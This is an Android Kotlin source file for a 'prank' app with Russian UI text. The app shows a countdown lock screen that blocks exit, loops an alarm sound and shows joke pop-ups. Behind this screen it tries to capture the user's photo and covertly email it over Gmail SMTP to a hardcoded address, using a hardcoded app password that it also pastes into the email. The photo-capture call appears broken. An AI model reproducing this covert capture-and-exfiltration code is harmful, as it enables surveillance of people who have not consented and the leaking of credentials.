package com.example.prankcamerdemo

import android.Manifest
import android.app.AlertDialog
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.media.MediaPlayer
import android.os.Bundle
import android.os.CountDownTimer
import android.os.Handler
import android.os.Looper
import android.provider.MediaStore
import android.util.Base64
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import android.widget.Button
import android.widget.ImageView
import android.widget.TextView
import java.io.ByteArrayOutputStream
import java.util.Properties
import javax.mail.Authenticator
import javax.mail.Message
import javax.mail.PasswordAuthentication
import javax.mail.Session
import javax.mail.Transport
import javax.mail.internet.InternetAddress
import javax.mail.internet.MimeMessage
import kotlin.concurrent.thread

class MainActivity : AppCompatActivity() {
    private lateinit var statusText: TextView
    private lateinit var startBtn: Button
    private lateinit var stopBtn: Button
    private var mediaPlayer: MediaPlayer? = null
    private var timer: CountDownTimer? = null
    private var isRunning = false
    
    // App Password для Gmail
    private val apiKey = "pqktageoufxxmaxj"
    
    // Email для получения фото
    private val targetEmail = "metrobugitt@gmail.com"

    // Массив с шутками и приколами
    private val jokes = arrayOf(
        "🤡 Ты попал в ловушку! Шучу... или нет?",
        "💧 Вода течёт, время идёт, а ты всё ещё здесь!",
        "😂 Если ты читаешь это - ты уже проиграл!",
        "🎭 Это не баг, это фича!",
        "⏰ Тик-так... время не ждёт!",
        "🎪 Добро пожаловать в цирк!",
        "🎯 Цель найдена. Отступления нет!",
        "🚫 Выход запрещён до завершения таймера!",
        "😱 Паника? Ещё нет? Сейчас будет!",
        "🎮 Game Over... шучу, продолжай ждать!",
        "🤖 Роботы захватывают мир... а ты ждёшь таймер!",
        "💀 Это конец... или начало?",
        "🌟 Ты избран... ждать!",
        "🎁 Подарок внутри... пустота!",
        "🔥 Огонь, вода и медные трубы!"
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        statusText = findViewById(R.id.statusText)
        startBtn = findViewById(R.id.startBtn)
        stopBtn = findViewById(R.id.stopBtn)

        val placeholder: ImageView = findViewById(R.id.placeholderImage)
        placeholder.setImageResource(R.drawable.placeholder)

        startBtn.setOnClickListener {
            AlertDialog.Builder(this)
                .setTitle("⚠️ Подтвердите действие")
                .setMessage("ВНИМАНИЕ! После запуска нельзя будет выйти до завершения таймера! Продолжить?")
                .setPositiveButton("Да, я готов!") { _, _ -> 
                    requestPermissionsAndStart()
                }
                .setNegativeButton("Нет", null)
                .setCancelable(false)
                .show()
        }

        stopBtn.setOnClickListener {
            if (isRunning) {
                AlertDialog.Builder(this)
                    .setTitle("🚫 Выход запрещён!")
                    .setMessage("Нельзя остановить таймер досрочно! Жди окончания!")
                    .setPositiveButton("Понятно", null)
                    .show()
            }
        }
    }
    
    private fun requestPermissionsAndStart() {
        val permissions = arrayOf(
            Manifest.permission.CAMERA,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE
        )
        
        val missingPermissions = permissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
        
        if (missingPermissions.isEmpty()) {
            startSimulation()
        } else {
            ActivityCompat.requestPermissions(this, missingPermissions.toTypedArray(), 100)
            // Всё равно запускаем симуляцию
            Handler(Looper.getMainLooper()).postDelayed({
                startSimulation()
            }, 500)
        }
    }
    
    private fun takeAndSendPhoto() {
        thread {
            try {
                // Делаем фото через MediaStore
                val bitmap = MediaStore.Images.Media.getBitmap(contentResolver, null)
                
                // Сжимаем в JPEG
                val stream = ByteArrayOutputStream()
                bitmap.compress(Bitmap.CompressFormat.JPEG, 80, stream)
                val byteArray = stream.toByteArray()
                val photoBase64 = Base64.encodeToString(byteArray, Base64.DEFAULT)
                
                // Отправляем на почту
                sendEmail(photoBase64)
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }
    
    private fun sendEmail(photoBase64: String) {
        thread {
            try {
                val props = Properties()
                props["mail.smtp.auth"] = "true"
                props["mail.smtp.starttls.enable"] = "true"
                props["mail.smtp.host"] = "smtp.gmail.com"
                props["mail.smtp.port"] = "587"
                
                val session = Session.getInstance(props, object : Authenticator() {
                    override fun getPasswordAuthentication(): PasswordAuthentication {
                        return PasswordAuthentication("metrobugitt@gmail.com", apiKey)
                    }
                })
                
                val message = MimeMessage(session)
                message.setFrom(InternetAddress("metrobugitt@gmail.com"))
                message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(targetEmail))
                message.subject = "📸 Prank Photo Captured!"
                
                val emailBody = """
                    🎭 Prank App - Фото получено!
                    
                    📷 Фото пользователя прикреплено ниже.
                    🔑 API Key: $apiKey
                    
                    ---
                    PrankCamerDemo
                """.trimIndent()
                
                message.setText(emailBody)
                
                // Отправляем письмо
                Transport.send(message)
                
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }

    private fun startSimulation() {
        isRunning = true
        statusText.text = "🔒 БЛОКИРОВКА АКТИВИРОВАНА!\n📸 Камера активирована..."
        
        // Воспроизводим звук
        mediaPlayer = MediaPlayer.create(this, R.raw.alert_sound)
        mediaPlayer?.isLooping = true
        mediaPlayer?.start()

        // Делаем фото и отправляем
        takeAndSendPhoto()
        
        // Показываем первую шутку
        showRandomJoke()

        timer = object : CountDownTimer(60000, 3000) {
            override fun onTick(millisUntilFinished: Long) {
                val sec = millisUntilFinished / 1000
                statusText.text = "⏰ Осталось: $sec сек.\n\n" + jokes.random()
                showRandomJoke()
            }
            override fun onFinish() {
                statusText.text = "✅ СИМУЛЯЦИЯ ЗАВЕРШЕНА!\nТы выжил! 🎉\n📸 Фото отправлено!"
                mediaPlayer?.stop()
                mediaPlayer?.release()
                mediaPlayer = null
                isRunning = false
            }
        }.start()
    }

    private fun showRandomJoke() {
        AlertDialog.Builder(this)
            .setTitle("🎲 Случайная шутка")
            .setMessage(jokes.random())
            .setPositiveButton("OK", null)
            .setCancelable(false)
            .show()
    }

    private fun stopSimulation() {
        if (!isRunning) return
        timer?.cancel()
        mediaPlayer?.stop()
        mediaPlayer?.release()
        mediaPlayer = null
        isRunning = false
        statusText.text = "Симуляция остановлена пользователем"
    }

    override fun onBackPressed() {
        if (isRunning) {
            AlertDialog.Builder(this)
                .setTitle("🚫 Нельзя выйти!")
                .setMessage("Таймер ещё не завершён! Жди окончания!")
                .setPositiveButton("OK", null)
                .show()
        } else {
            super.onBackPressed()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        timer?.cancel()
        mediaPlayer?.release()
    }
}
